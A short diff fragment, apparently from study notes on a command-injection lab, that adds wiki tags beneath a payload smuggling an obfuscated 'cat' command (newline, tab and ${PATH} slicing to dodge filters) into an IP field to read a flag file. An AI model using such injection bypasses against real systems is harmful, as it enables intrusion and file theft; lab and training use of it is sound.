@@ -16,3 +16,5 @@
 127.0.0.1%0ac'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 ```
 
+[[Cybersecurity]]
+[[SQL]]
